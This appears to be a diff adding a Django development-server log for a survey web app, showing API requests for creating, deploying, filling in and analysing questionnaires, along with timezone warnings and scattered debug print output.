+[09/Jun/2024 07:17:46] "POST /api/qs/Submit/release_to_square HTTP/1.1" 200 37
+[09/Jun/2024 07:17:52] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1349
+[09/Jun/2024 07:17:56] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1349
+[09/Jun/2024 07:18:02] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 138
+/root/wtf/lib64/python3.6/site-packages/django/db/models/fields/__init__.py:1419: RuntimeWarning: DateTimeField Survey.release_time received a naive datetime (2024-06-09 07:18:03.351546) while time zone support is active.
+  RuntimeWarning)
+[09/Jun/2024 07:18:03] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:18:05] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1349
+[09/Jun/2024 07:18:07] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 806
+[09/Jun/2024 07:18:56] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 36
+[09/Jun/2024 07:19:22] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 475
+[09/Jun/2024 07:19:24] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:20:08] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1424
+[09/Jun/2024 07:20:11] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 490
+[09/Jun/2024 07:20:11] "POST /api/qs/Submit/collect_survey HTTP/1.1" 200 37
+[09/Jun/2024 07:20:14] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:20:15] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 490
+[09/Jun/2024 07:20:27] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 69
+[09/Jun/2024 07:20:35] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:20:37] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 490
+[09/Jun/2024 07:21:32] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 239
+[09/Jun/2024 07:21:45] "POST /api/qs/Submit/create_QN HTTP/1.1" 200 54
+[09/Jun/2024 07:21:47] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 344
+/root/wtf/lib64/python3.6/site-packages/django/db/models/fields/__init__.py:1419: RuntimeWarning: DateTimeField Survey.release_time received a naive datetime (2024-06-09 07:21:50.130762) while time zone support is active.
+  RuntimeWarning)
+[09/Jun/2024 07:21:50] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:21:52] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 922
+[09/Jun/2024 07:22:14] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 922
+[09/Jun/2024 07:22:26] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 922
+[09/Jun/2024 07:22:31] "POST /api/qs/Submit/pause_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:22:33] "POST /api/qs/Submit/delete_survey_not_real HTTP/1.1" 200 40
+[09/Jun/2024 07:22:33] "POST /api/qs/Submit/delete_survey_not_real HTTP/1.1" 200 40
+[09/Jun/2024 07:22:35] "POST /api/qs/Submit/pause_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:22:35] "POST /api/qs/Submit/delete_survey_not_real HTTP/1.1" 200 40
+[09/Jun/2024 07:22:50] "POST /api/qs/Submit/create_QN HTTP/1.1" 200 54
+[09/Jun/2024 07:22:51] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 133
+/root/wtf/lib64/python3.6/site-packages/django/db/models/fields/__init__.py:1419: RuntimeWarning: DateTimeField Survey.release_time received a naive datetime (2024-06-09 07:22:52.615128) while time zone support is active.
+  RuntimeWarning)
+[09/Jun/2024 07:22:52] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:22:55] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 801
+[09/Jun/2024 07:23:04] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 36
+[09/Jun/2024 07:23:09] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 801
+[09/Jun/2024 07:23:12] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 69
+[09/Jun/2024 07:23:15] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 69
+[09/Jun/2024 07:24:13] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 801
+[09/Jun/2024 07:24:18] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:24:28] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 801
+[09/Jun/2024 07:24:53] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:24:53] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:24:59] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 801
+[09/Jun/2024 07:26:15] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 430
+[09/Jun/2024 07:26:50] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:26:51] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 490
+[09/Jun/2024 07:26:58] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+
+[{'id': 53}, {'id': 60}, {'id': 62}, {'id': 131}, {'id': 134}, {'id': 139}, {'id': 140}, {'id': 138}, {'id': 142}, {'id': 113}, {'id': 124}, {'id': 143}]
+[{'id': 124}, {'id': 139}, {'id': 140}, {'id': 150}]
+[{'id': 138, 'title': '的那网络文化的俩位', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 139, 'title': '大撒旦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 140, 'title': '111', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 142, 'title': '222', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 143, 'title': '欧几哦i', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}]
+i am here
+154
+王飞阳
+i am here
+王飞阳
+王飞阳
+i am here
+王飞阳
+i am here
+王飞阳
+i am here
+153
+138
+124
+124
+133
+133
+131
+131
+134
+134
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 154, 'title': 'os', 'type': '1', 'state': 1, 'used_time': 1}]
+[{'id': 62}, {'id': 53}]
+[{'id': 124}, {'id': 133}, {'id': 131}, {'id': 134}]
+[{'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}]
+i am here
+138
+王飞阳
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+124
+124
+133
+133
+131
+131
+134
+134
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 154, 'title': 'os', 'type': '1', 'state': 1, 'used_time': 1}, {'id': 155, 'title': 'whatfuck', 'type': '0', 'state': 0, 'used_time': 0}]
+[{'id': 62}, {'id': 53}]
+[{'id': 124}, {'id': 133}, {'id': 131}, {'id': 134}]
+[{'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}]
+124
+124
+133
+133
+131
+131
+134
+134
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 154, 'title': 'os', 'type': '1', 'state': 1, 'used_time': 1}, {'id': 155, 'title': 'whatfuck', 'type': '0', 'state': 0, 'used_time': 0}]
+[{'id': 62}, {'id': 53}]
+[{'id': 124}, {'id': 133}, {'id': 131}, {'id': 134}]
+[{'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}]
+124
+124
+133
+133
+131
+131
+134
+134
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 154, 'title': 'os', 'type': '1', 'state': 1, 'used_time': 1}, {'id': 155, 'title': 'whatfuck', 'type': '0', 'state': 1, 'used_time': 0}]
+[{'id': 62}, {'id': 53}]
+[{'id': 124}, {'id': 133}, {'id': 131}, {'id': 134}]
+[{'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}]
+i am here
+155
+i am here
+王飞阳
+124
+124
+133
+133
+131
+131
+134
+134
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 154, 'title': 'os', 'type': '1', 'state': 1, 'used_time': 1}, {'id': 155, 'title': 'whatfuck', 'type': '0', 'state': 1, 'used_time': 1}]
+[{'id': 62}, {'id': 53}]
+[{'id': 124}, {'id': 133}, {'id': 131}, {'id': 134}]
+[{'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 155, 'title': 'whatfuck', 'type': '0', 'state': 1, 'used_time': 1}]
+i am here
+155 fuckman
+王飞阳
+i am here
+139
+王飞阳
+i am here
+bbb
+<class 'str'>
+aaaaa
+[{'content': '选项', 'choosed': False, 'arg': 0}, {'content': '选项', 'choosed': False, 'arg': 0}]
+360
+?????
+360
+?????
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+i am here
+i am here
+i am here
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+i am here
+157
+i am here
+157
+157
+i am here
+王飞阳
+i am here
+王飞阳
+王飞阳
+i am here
+i am here
+王飞阳
+i am here
+王飞阳
+[09/Jun/2024 07:27:47] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 133
+[09/Jun/2024 07:27:48] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 801
+[09/Jun/2024 07:28:40] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 430
+[09/Jun/2024 07:28:55] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 430
+[09/Jun/2024 07:30:11] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 490
+[09/Jun/2024 07:30:16] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:31:39] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 490
+[09/Jun/2024 07:32:03] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 133
+[09/Jun/2024 07:32:07] "POST /api/qs/Submit/pause_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:32:08] "POST /api/qs/Submit/delete_survey_not_real HTTP/1.1" 200 40
+[09/Jun/2024 07:32:25] "POST /api/qs/Submit/create_QN HTTP/1.1" 200 54
+[09/Jun/2024 07:32:26] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 134
+/root/wtf/lib64/python3.6/site-packages/django/db/models/fields/__init__.py:1419: RuntimeWarning: DateTimeField Survey.release_time received a naive datetime (2024-06-09 07:32:28.390285) while time zone support is active.
+  RuntimeWarning)
+[09/Jun/2024 07:32:28] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:32:30] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 653
+[09/Jun/2024 07:32:35] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 36
+[09/Jun/2024 07:32:44] "POST /api/qs/Submit/pause_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:32:55] "POST /api/qs/Submit/create_QN HTTP/1.1" 200 54
+[09/Jun/2024 07:32:56] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 239
+/root/wtf/lib64/python3.6/site-packages/django/db/models/fields/__init__.py:1419: RuntimeWarning: DateTimeField Survey.release_time received a naive datetime (2024-06-09 07:32:58.907504) while time zone support is active.
+  RuntimeWarning)
+[09/Jun/2024 07:32:58] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:33:00] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 652
+[09/Jun/2024 07:33:05] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 36
+Performing system checks...
+
+System check identified no issues (0 silenced).
+June 09, 2024 - 07:27:46
+Django version 3.2.25, using settings 'config.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+i am here
+i am here
+i am here
+i am here
+王飞阳
+i am here
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+i am here
+158
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+i am here
+159
+[09/Jun/2024 07:35:57] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 490
+[09/Jun/2024 07:36:13] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 239
+[09/Jun/2024 07:36:16] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2411
+[09/Jun/2024 07:36:24] "POST /api/qs/Submit/buy_survey HTTP/1.1" 200 37
+[09/Jun/2024 07:36:26] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:36:56] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:37:29] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 527
+[09/Jun/2024 07:37:42] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:37:44] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 840
+[09/Jun/2024 07:37:48] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:37:49] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 840
+[09/Jun/2024 07:38:00] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2422
+[09/Jun/2024 07:38:08] "POST /api/qs/Submit/buy_survey HTTP/1.1" 200 37
+[09/Jun/2024 07:38:09] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:38:19] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1699
+[09/Jun/2024 07:38:20] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 138
+[09/Jun/2024 07:38:21] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 806
+[09/Jun/2024 07:38:21] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 456
+[09/Jun/2024 07:38:22] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 295
+[09/Jun/2024 07:38:29] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1699
+[09/Jun/2024 07:38:32] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2434
+[09/Jun/2024 07:38:34] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:38:35] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2434
+[09/Jun/2024 07:38:39] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:38:40] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2434
+[09/Jun/2024 07:38:42] "POST /api/qs/Submit/buy_survey HTTP/1.1" 200 37
+[09/Jun/2024 07:38:43] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:38:45] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2447
+[09/Jun/2024 07:38:47] "POST /api/qs/Submit/buy_survey HTTP/1.1" 200 37
+[09/Jun/2024 07:38:48] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:38:49] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2459
+[09/Jun/2024 07:38:57] "POST /api/qs/Submit/buy_survey HTTP/1.1" 200 37
+[09/Jun/2024 07:39:00] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 07:39:10] "POST /api/qs/user/login HTTP/1.1" 200 109
+[09/Jun/2024 07:39:12] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 239
+[09/Jun/2024 07:39:15] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2471
+[09/Jun/2024 07:39:17] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:39:19] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2471
+[09/Jun/2024 07:39:20] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:39:21] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2471
+[09/Jun/2024 07:39:22] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1699
+[09/Jun/2024 07:39:32] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1035
+[09/Jun/2024 07:39:48] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2471
+[09/Jun/2024 07:39:51] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:40:36] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:40:37] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 2471
+Performing system checks...
+
+System check identified no issues (0 silenced).
+June 09, 2024 - 07:35:32
+Django version 3.2.25, using settings 'config.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+i am here
+150 ler_001
+150 ler_001
+i am here
+王飞阳
+i am here
+王飞阳
+i am here
+53 ler_001
+124
+124
+133
+133
+131
+131
+134
+134
+155
+155
+155 fuckman
+155
+None
+155
+[[{'name': 0, 'y': 0}, {'name': 1, 'y': 0}, {'name': 2, 'y': 0}, {'name': 3, 'y': 0}, {'name': 4, 'y': 1}], [{'name': 0, 'y': 1}, {'name': 1, 'y': 0}, {'name': 2, 'y': 0}, {'name': 3, 'y': 0}, {'name': 4, 'y': 0}], [{'name': 0, 'y': 0}, {'name': 1, 'y': 1}, {'name': 2, 'y': 0}, {'name': 3, 'y': 0}, {'name': 4, 'y': 0}], [{'name': 0, 'y': 0}, {'name': 1, 'y': 0}, {'name': 2, 'y': 1}, {'name': 3, 'y': 0}, {'name': 4, 'y': 0}]]
+155
+124
+124
+133
+133
+131
+131
+134
+134
+155
+155
+53 ler_001
+150 ler_001
+154 ler_001
+62 ler_001
+True
+None
+ler_001
+444
+53 ler_001
+62 ler_001
+124
+124
+133
+133
+131
+131
+134
+134
+155
+155
+i am here
+150 ler_001
+60 ler_001
+[09/Jun/2024 07:40:48] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:40:50] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1633
+[09/Jun/2024 07:40:51] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 38
+[09/Jun/2024 07:40:52] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1633
+[09/Jun/2024 07:41:17] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 430
+[09/Jun/2024 09:30:51] "POST /api/qs/user/login HTTP/1.1" 200 110
+[09/Jun/2024 09:34:12] "POST /api/qs/user/login HTTP/1.1" 200 18
+[09/Jun/2024 09:34:16] "POST /api/qs/user/login HTTP/1.1" 200 18
+[09/Jun/2024 09:34:19] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 557
+[09/Jun/2024 09:35:40] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 664
+[09/Jun/2024 09:37:19] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 500 145
+[09/Jun/2024 09:37:28] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 557
+[09/Jun/2024 09:38:05] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 500 145
+[09/Jun/2024 09:40:13] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 500 145
+[09/Jun/2024 09:40:22] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 500 145
+[09/Jun/2024 09:40:27] "POST /api/qs/user/login HTTP/1.1" 200 179
+[09/Jun/2024 09:40:29] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1633
+[09/Jun/2024 09:40:34] "POST /api/qs/Submit/edit_survey_FS HTTP/1.1" 200 149
+[09/Jun/2024 09:40:37] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1633
+[09/Jun/2024 09:40:37] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 09:40:38] "POST /api/qs/Submit/pause_qn HTTP/1.1" 200 40
+[09/Jun/2024 09:40:43] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 09:40:50] "POST /api/qs/user/login HTTP/1.1" 200 18
+[09/Jun/2024 09:40:53] "POST /api/qs/Submit/pause_qn HTTP/1.1" 200 40
+[09/Jun/2024 09:41:05] "POST /api/qs/user/login HTTP/1.1" 200 18
+[09/Jun/2024 09:41:16] "POST /api/qs/user/login HTTP/1.1" 200 179
+[09/Jun/2024 09:41:19] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1633
+[09/Jun/2024 09:41:30] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1633
+[09/Jun/2024 09:41:49] "POST /api/qs/user/change/username HTTP/1.1" 200 18
+[09/Jun/2024 09:42:09] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 09:42:15] "POST /api/qs/user/login HTTP/1.1" 200 18
+[09/Jun/2024 09:42:51] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 09:43:20] "POST /api/qs/user/change/username HTTP/1.1" 200 18
+[09/Jun/2024 09:43:27] "POST /api/qs/user/login HTTP/1.1" 200 179
+[09/Jun/2024 09:43:30] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1633
+[09/Jun/2024 09:43:43] "POST /api/qs/Submit/pause_qn HTTP/1.1" 200 40
+[09/Jun/2024 09:43:45] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1633
+[09/Jun/2024 09:43:50] "POST /api/qs/Submit/copy_survey HTTP/1.1" 200 54
+[09/Jun/2024 09:43:50] "POST /api/qs/Submit/get_survey_in_recyclebin_data HTTP/1.1" 200 411
+[09/Jun/2024 09:43:51] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1747
+[09/Jun/2024 09:43:52] "POST /api/qs/Submit/edit_survey_FS HTTP/1.1" 200 2139
+[09/Jun/2024 09:43:55] "POST /api/qs/Submit/delete_survey_real HTTP/1.1" 200 40
+[09/Jun/2024 09:43:57] "POST /api/qs/Submit/delete_survey_real HTTP/1.1" 200 40
+[09/Jun/2024 09:44:00] "POST /api/qs/Submit/delete_survey_real HTTP/1.1" 200 40
+[09/Jun/2024 09:44:03] "POST /api/qs/Submit/delete_survey_real HTTP/1.1" 200 40
+[09/Jun/2024 09:44:34] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1747
+[09/Jun/2024 09:44:40] "POST /api/qs/Submit/edit_survey_FS HTTP/1.1" 200 2139
+[09/Jun/2024 09:44:55] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1747
+[09/Jun/2024 09:45:18] "POST /api/qs/Submit/get_survey_in_recyclebin_data HTTP/1.1" 200 30
+[09/Jun/2024 09:45:20] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1747
+[09/Jun/2024 09:47:15] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3076
+[09/Jun/2024 09:47:15] "POST /api/qs/user/login HTTP/1.1" 200 110
+[09/Jun/2024 09:47:18] "POST /api/qs/Submit/collect_survey HTTP/1.1" 200 37
+[09/Jun/2024 09:47:23] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:47:37] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 498
+[09/Jun/2024 09:47:38] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:47:49] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 09:48:16] "POST /api/qs/user/login HTTP/1.1" 200 110
+[09/Jun/2024 09:48:47] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 3089
+[09/Jun/2024 09:48:52] "POST /api/qs/Submit/get_history HTTP/1.1" 200 971
+[09/Jun/2024 09:48:53] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 490
+[09/Jun/2024 09:48:54] "POST /api/qs/Submit/get_history HTTP/1.1" 200 971
